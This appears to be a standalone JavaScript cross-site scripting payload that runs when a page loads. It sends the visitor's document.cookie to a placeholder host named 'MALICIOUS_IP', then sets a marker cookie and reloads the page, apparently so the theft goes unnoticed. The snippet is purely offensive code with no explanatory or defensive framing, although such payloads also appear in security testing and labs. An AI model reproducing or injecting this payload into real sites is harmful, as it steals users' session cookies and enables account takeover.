document.addEventListener("DOMContentLoaded", function() {
    var xhr = new XMLHttpRequest();

    xhr.open("GET", "https://MALICIOUS_IP/?" + document.cookie, true);

    xhr.onloadend = function() {
        // This function will be called once the request completes, regardless of success or error

        // Set the x-custom-header cookie
        document.cookie = "x-custom-header=true; path=/";

        // Redirect back to the original site or path
        window.location.href = window.location.pathname;
    };

    xhr.send();
});